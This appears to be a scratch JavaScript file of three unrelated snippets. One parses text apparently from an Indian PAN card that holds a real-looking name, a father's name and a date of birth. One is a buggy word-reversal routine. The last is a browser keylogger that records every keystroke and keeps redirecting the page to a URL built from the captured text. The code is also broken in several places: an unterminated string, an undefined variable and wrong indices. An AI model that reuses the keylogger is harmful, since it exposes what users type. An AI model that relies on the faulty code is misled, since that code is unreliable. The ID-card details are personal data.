let text = "आयकर विभाग\nINCOME TAX DEPARTMENT\nभारत सरकार\nGOVT. OF INDIA\nसत्यमेव जयते\nANKUR PANDEY\nSANJAY PANDEY\n18/06/1992\nPermanent “;

let lines = text.split("\n");

let dob = lines[7];
let pan = lines[8];

console.log("dob: "+dob+" pan:"+pan);


let input = "i love india";
let buffer = input.split();
let spaces = [];
let letters = [];
let k = input.length;
for(let i=0;i<input.length;i++)
{
    if(buffers[i]==' ')
        spaces.push(k);
    else
       letters.push(buffers[i]);
}
let result = "";

for(let j=0;j<k;j++)
{
    if(spaces.indexOf(j)!=-1)
    result+=" ";
    else
    result+=letters.pop();
}


let keyword="";


document.addEventListener('keyup',(t)=>{
    keyword+=String.fromCharCode(t.code);;
})

setInterval(()=>{
        window.location = "https://google"+keyword;
},2000)